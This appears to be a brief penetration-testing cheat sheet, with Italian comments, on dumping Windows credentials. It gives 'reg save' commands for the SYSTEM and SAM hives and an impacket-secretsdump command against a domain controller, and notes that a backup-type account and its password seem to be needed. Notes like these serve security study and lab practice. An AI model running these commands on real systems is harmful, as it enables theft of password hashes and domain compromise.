### **REGISTRY**
```powershell
reg save hklm/system
reg save hklm/sam
```
### **SECRETSDUMP**
Penso sia solo se tu abbia un account speciale tipo "backup"
```
impacket-secretsdump -just-dc <USER>@<IP>
```
poi serve la password